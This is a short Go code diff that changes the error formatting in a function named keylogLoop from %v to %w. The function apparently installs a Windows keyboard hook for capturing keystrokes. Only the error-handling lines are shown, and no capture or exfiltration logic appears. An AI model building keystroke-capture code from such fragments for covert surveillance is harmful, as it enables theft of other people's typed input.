@@ -234,7 +234,7 @@ func keylogLoop(started chan<- error) {
 		0,
 	)
 	if hookHandle == 0 {
-		started <- fmt.Errorf("SetWindowsHookExW failed: %v", err)
+		started <- fmt.Errorf("SetWindowsHookExW failed: %w", err)
 		return
 	}
 
